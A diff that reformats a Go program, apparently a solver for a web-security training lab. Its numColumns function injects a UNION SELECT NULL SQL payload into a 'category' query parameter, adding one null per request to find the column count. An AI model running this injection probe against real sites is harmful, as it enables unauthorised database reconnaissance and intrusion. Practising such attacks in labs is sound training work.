@@ -4,9 +4,9 @@ package main
 
 import (
 	"fmt"
+	"log"
 	"net/http"
 	"net/http/cookiejar"
-	"log"
 	"net/url"
 	"strings"
 )
@@ -38,23 +38,22 @@ func numColumns(u string, client *http.Client) (int, error) {
 	for i := 1; i <= 20; i++ {
 		nulls := make([]string, i)
 		for j := 0; j < len(nulls); j++ {
-    			nulls[j] = "null"
+			nulls[j] = "null"
 		}
 
-		filterUrl := u + "?category=" + url.QueryEscape("Gifts' union select " + strings.Join(nulls, ",") + "--")
+		filterUrl := u + "?category=" + url.QueryEscape("Gifts' union select "+strings.Join(nulls, ",")+"--")
 		fmt.Println(filterUrl)
 		resp, err := client.Get(filterUrl)
 		if err != nil {
 			return 0, err
 		}
 		defer resp.Body.Close()
-		if resp.StatusCode / 100 == 2 {
+		if resp.StatusCode/100 == 2 {
 			return i, nil
 		}
 	}
 	return 0, fmt.Errorf("greater than 20")
 }
-
 
 func newClient() (*http.Client, error) {
 	jar, err := cookiejar.New(nil)
@@ -64,4 +63,3 @@ func newClient() (*http.Client, error) {
 
 	return &http.Client{Jar: jar}, nil
 }
-
